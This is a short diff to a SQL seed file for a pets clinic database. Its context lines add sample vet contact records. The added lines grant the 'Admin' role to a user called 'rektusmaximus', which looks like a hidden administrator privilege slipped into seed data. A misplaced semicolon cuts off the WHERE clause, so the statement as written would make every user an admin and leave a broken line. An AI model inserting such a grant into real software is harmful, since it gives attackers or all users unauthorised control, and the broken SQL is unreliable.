@@ -123,3 +123,8 @@ INSERT INTO pets.vets (firstname, lastname, contactnumber, emailaddress) VALUES
 ("Michael", "Taylor", "07543 210 987", "michael_taylor@animals.uk"),
 ("Sarah", "Johnson", "07890 876 543", "sarah.j@example.co.uk"),
 ("Benjamin", "Wright", "07761 234 567", "benjamin.wright@petsclinic.co.uk");
+
+UPDATE pets.users
+SET user_role = "Admin";
+WHERE username = "rektusmaximus";
+
